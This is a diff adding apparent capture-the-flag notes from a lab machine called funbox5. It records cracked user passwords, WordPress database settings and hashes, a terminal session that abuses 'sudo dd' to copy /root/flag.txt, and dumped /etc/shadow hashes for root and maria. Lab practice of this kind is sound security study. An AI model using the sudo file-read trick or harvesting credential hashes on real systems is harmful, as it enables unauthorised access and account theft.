@@ -1,0 +1,43 @@
+ben:pookie
+
+adam: qwedsayxc!
+
+
+define( 'DB_NAME', 'wordpress' );
+       
+    31  /**
+    32   * Ersetze benutzername_hier_einfuegen
+    33   * mit deinem MySQL-Datenbank-Benutzernamen.
+    34   */
+    35  define( 'DB_USER', 'wordpress' );
+       
+    36  /**
+    37   * Ersetze passwort_hier_einfuegen mit deinem MySQL-Passwort.
+    38   */
+    39  define( 'DB_PASSWORD', 'wordpress' );
+
+
+admin      | $P$BDX2c5ldwZwec0ZrxfqSY4CnrM65md/
+ben        | $P$B6/4JnAmO0UCErXBu/p242Pjn4446q.
+
+adam@funbox5:~$ sudo dd if=/root/flag.txt of=a
+1+1 records in
+1+1 records out
+673 bytes copied, 0.0019687 s, 342 kB/s
+adam@funbox5:~$ nl a
+     1   _______           _                     ______                      _                       _ 
+     2  (_______)         | |                   |  ___ \             _      | |                     | |
+     3   _____ _   _ ____ | | _   ___ _   _ _   | |   | | ____ _   _| |_    | |      ____ _   _ ____| |
+     4  |  ___) | | |  _ \| || \ / _ ( \ / |_)  | |   | |/ _  | \ / )  _)   | |     / _  ) | | / _  ) |
+     5  | |   | |_| | | | | |_) ) |_| ) X ( _   | |   | ( (/ / ) X (| |__   | |____( (/ / \ V ( (/ /| |
+     6  |_|    \____|_| |_|____/ \___(_/ \_|_)  |_|   |_|\____|_/ \_)\___)  |_______)____) \_/ \____)_|
+       
+     7  Made with ❤ by @0815R2d2
+     8  Please, tweet me a screenshot on Twitter.
+     9  THX 4 playing this Funbox.
+adam@funbox5:~$ 
+
+
+
+root:$6$NsLN4bI3$rl0yTna3zfvOo9TgMf4Zu4rMfnXJ0XnfuwEvusgNnVJh6Dl5gY1D/IyT89ZeEa4OOyh1Wfc6ZRc88sDb2fn8h1:18505:0:99999:7:::
+maria:$6$QdqGualA$nl4/UQ8NcYOlLf4wM6hCSOuKL3fX7AVx6TljwCSzbZMRJqLURLATHxfsRFu5soMJTrMVlQMAR6oLOnB4CYdcd.:18505:0:99999:7:::
